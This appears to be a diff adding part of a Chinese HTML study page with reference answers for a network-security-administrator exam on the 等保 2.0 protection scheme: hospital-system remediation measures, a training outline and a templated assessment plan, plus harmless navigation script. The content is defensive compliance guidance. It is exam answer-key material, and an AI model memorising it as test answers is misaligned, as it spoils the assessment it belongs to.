+      <ul>
+        <li>备份方式（全量 / 增量 / 差异）</li>
+        <li>备份频度（每日 / 每周 / 每月）</li>
+        <li>存储介质（磁盘 / 磁带 / 云）</li>
+        <li>保留期限（须满足法规与业务恢复目标）</li>
+      </ul>
+
+      <h3>问题 5：整改建议（按等保 2.0 逐条对标）</h3>
+      <p>结合案例材料中 HIS 系统常见的薄弱环节，针对性提出整改措施：</p>
+
+      <p><strong>① 安全管理中心方面</strong></p>
+      <ul>
+        <li>设立独立的系统管理员、安全管理员、审计管理员"三员"岗位，明确职责分离与互斥监督；</li>
+        <li>部署集中管控平台，统一纳管防火墙、堡垒机、数据库审计、终端 EDR 等安全组件；</li>
+        <li>将日志统一接入 SOC / SIEM 平台，保留期不少于 6 个月，并配置关联分析与告警规则；</li>
+        <li>建立补丁基线与版本基线，由集中管控平台统一下发安全补丁与恶意代码库升级。</li>
+      </ul>
+
+      <p><strong>② 安全区域边界方面</strong></p>
+      <ul>
+        <li>按业务域划分安全区域，门诊、住院、办公、互联网接入区之间通过下一代防火墙隔离；</li>
+        <li>梳理并收敛对外开放端口，严格按"白名单"模式配置 ACL，删除长期未用的无效规则；</li>
+        <li>在互联网出口与核心交换机旁路部署 IPS，对 SQL 注入、Webshell 上传等行为实时阻断；</li>
+        <li>关闭不必要的无线 AP，确需使用的统一通过准入网关接入，并强制 802.1X 认证。</li>
+      </ul>
+
+      <p><strong>③ 安全计算环境方面</strong></p>
+      <ul>
+        <li>服务器与数据库开启强口令策略 + 多因素认证，禁止默认账号、共享账号；</li>
+        <li>关键业务系统启用主机 EDR，应用最小权限原则与数据库行级访问控制；</li>
+        <li>部署统一防病毒平台，启用主机防火墙与白名单机制；</li>
+        <li>患者敏感数据（含姓名、身份证、病历）按等保要求加密存储与传输，关键字段脱敏展示。</li>
+      </ul>
+
+      <p><strong>④ 安全运维管理方面</strong></p>
+      <ul>
+        <li>建立资产配置管理库（CMDB），动态记录拓扑、软件清单、版本补丁与配置基线；</li>
+        <li>制定《安全事件报告与处置管理制度》，明确 5×8 / 7×24 值班与上报流程；</li>
+        <li>核心 HIS 数据采用"本地全量 + 异地增量 + 云端快照"的三级备份策略，恢复演练每半年至少 1 次；</li>
+        <li>引入等保测评与攻防演练（红蓝对抗）机制，每年开展 1 次等级测评与渗透测试。</li>
+      </ul>
+
+      <h3>解题套路小结</h3>
+      <ol>
+        <li><strong>定级：</strong>结合"业务信息"与"系统服务"两条线分别判定，再按就高原则汇总。</li>
+        <li><strong>安全管理中心：</strong>围绕系统管理、安全管理、集中管控三大块成体系作答。</li>
+        <li><strong>安全区域边界：</strong>按边界防护 → 访问控制 → 入侵防范三段式展开。</li>
+        <li><strong>安全运维管理：</strong>围绕资产配置、事件制度、备份要求三块做清单式回答。</li>
+        <li><strong>整改建议：</strong>从管理中心、区域边界、计算环境、运维管理 4 个维度，对照等保 2.0 控制项逐条给出整改措施。</li>
+      </ol>
+    </section>
+
+    <!-- ============ 6 ============ -->
+    <section id="sec6" class="section anchor">
+      <h1>6. 培训实施与技术指导 - F · 培训大纲 + 考核方案</h1>
+
+      <h2>题目要求</h2>
+      <ol>
+        <li>结合国标二级"网络安全等级保护"工作内容，拟制一份培训大纲。</li>
+        <li>结合国标二级"网络安全等级保护"工作内容，拟制一份考核方案。</li>
+      </ol>
+
+      <h2>参考答案 1：网络安全等级保护培训大纲</h2>
+
+      <h3>一、总体说明</h3>
+      <p><strong>编制依据：</strong>参照《网络与信息安全管理员》国家职业技能标准（2020 版）对二级/技师的技能要求设计本次培训。</p>
+      <p><strong>培训目标：</strong>帮助学员系统掌握等保定级、备案、测评、整改、运维全流程的知识点与实操技能。</p>
+      <p><strong>核心模块：</strong>等保 2.0 控制项解读、定级方法论、差距分析思路、整改方案设计、等级测评流程。</p>
+      <p><strong>预期收获：</strong>具备独立承接等保项目的能力，满足职业技能等级认定的考核要求。</p>
+
+      <h3>二、培训安排</h3>
+      <ul>
+        <li><strong>参训对象：</strong>二级/技师方向学员</li>
+        <li><strong>培训时长：</strong>共 X 天，合计 X 学时</li>
+        <li><strong>培训场地：</strong>XXX 机房或多媒体教室</li>
+        <li><strong>组织形式：</strong>理论精讲 + 案例研讨 + 实操训练三位一体</li>
+      </ul>
+
+      <h3>三、课程模块清单</h3>
+      <p>围绕国标二级"网络安全等级保护"工作要求：</p>
+      <ol>
+        <li>等保制度演进与现行标准体系</li>
+        <li>信息系统定级方法与备案流程</li>
+        <li>安全物理环境控制项详解</li>
+        <li>安全通信网络设计与实现</li>
+        <li>安全区域边界的访问控制与防护</li>
+        <li>安全计算环境的合规要求</li>
+        <li>安全管理中心的建设思路</li>
+        <li>安全管理机构与管理制度</li>
+        <li>安全建设管理与安全运维管理</li>
+        <li>等级测评实施与整改复测要点</li>
+      </ol>
+
+      <h3>四、考核安排</h3>
+      <ol>
+        <li><strong>成绩构成：</strong>理论考核 40% + 实操考核 60%</li>
+        <li><strong>考核时间：</strong>培训结束后的第 X 天统一组织</li>
+        <li><strong>考核方式：</strong>上机考试 + 案例分析 + 实操任务</li>
+      </ol>
+
+      <h3>五、培训资源保障</h3>
+      <ol>
+        <li>专用培训教室、多媒体教学设备</li>
+        <li>等保案例库、测评工具链与演练靶场</li>
+        <li>配套教材、PPT 讲义、实验操作手册</li>
+      </ol>
+
+      <h2>参考答案 2：网络安全等级保护考核方案</h2>
+
+      <h3>一、时间安排（0.5 分）</h3>
+      <ul>
+        <li><strong>考核日期：</strong>20XX 年 X 月 X 日</li>
+        <li><strong>起止时段：</strong>XX:XX — XX:XX</li>
+        <li>考试日期务必晚于本方案的制定日期</li>
+      </ul>
+
+      <h3>二、考核场地（0.5 分）</h3>
+      <p>XXX 单位 X 号楼 X 层 XXX 教室（须写到具体楼层或房间号）。</p>
+
+      <h3>三、考核形式（0.5 分）</h3>
+      <p>线下理论闭卷 + 实操现场考核。</p>
+
+      <h3>四、考核全流程（0.5 分）</h3>
+      <ul>
+        <li><strong>考前阶段：</strong>设备调试、考生签到、宣读考场规则、试卷与耗材发放</li>
+        <li><strong>考中阶段：</strong>计时统考、监考巡查、考生答疑</li>
+        <li><strong>考后阶段：</strong>收卷封装、阅卷评分、成绩公示、试卷归档</li>
+      </ul>
+
+      <h3>五、题型题量与分值占比（0.5 分）</h3>
+      <table>
+        <thead>
+          <tr><th>题型</th><th>数量</th><th>分值</th><th>小计</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>单选题</td><td>X 题</td><td>X 分/题</td><td>X 分</td></tr>
+          <tr><td>多选题</td><td>X 题</td><td>X 分/题</td><td>X 分</td></tr>
+          <tr><td>案例分析题</td><td>X 题</td><td>X 分/题</td><td>X 分</td></tr>
+          <tr><td>实操题</td><td>X 题</td><td>X 分/题</td><td>X 分</td></tr>
+          <tr><td><strong>合计</strong></td><td></td><td></td><td><strong>100 分</strong></td></tr>
+        </tbody>
+      </table>
+
+      <h3>六、核心考核内容（2 分）</h3>
+      <p>紧扣国标二级等保工作要求：</p>
+      <ol>
+        <li>等保制度框架与定级方法</li>
+        <li>等保 2.0 控制项（技术 + 管理）</li>
+        <li>差距分析方法与整改建议输出</li>
+        <li>等级测评全流程与报告撰写</li>
+        <li>安全运维管理体系搭建</li>
+      </ol>
+      <p>考核内容与考核要求保持对应，避免出现"考而不评、评而不考"。</p>
+
+      <h3>七、组织单位（0.5 分）</h3>
+      <p>XXX 单位 / 部门统一组织。</p>
+    </section>
+
+  </main>
 </div>
+
+<a href="#" class="back-to-top" id="backToTop" title="返回顶部">↑</a>
+
+<script>
+  // 滚动时高亮当前导航项
+  const navLinks = document.querySelectorAll('.nav-item a');
+  const sections = document.querySelectorAll('section[id]');
+  const backToTop = document.getElementById('backToTop');
+
+  function updateActiveNav() {
+    const scrollPos = window.scrollY + 120;
+    let currentId = '';
+
+    sections.forEach((sec) => {
+      if (sec.offsetTop <= scrollPos) {
+        currentId = sec.id;
+      }
+    });
+
+    navLinks.forEach((link) => {
+      link.classList.remove('active');
+      if (link.getAttribute('href') === '#' + currentId) {
+        link.classList.add('active');
+      }
+    });
+
+    if (window.scrollY > 400) {
+      backToTop.classList.add('show');
+    } else {
+      backToTop.classList.remove('show');
+    }
+  }
+
+  window.addEventListener('scroll', updateActiveNav, { passive: true });
+  updateActiveNav();
+
+  // 平滑滚动到顶部
+  backToTop.addEventListener('click', (e) => {
+    e.preventDefault();
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  });
+</script>
 </body>
 </html>
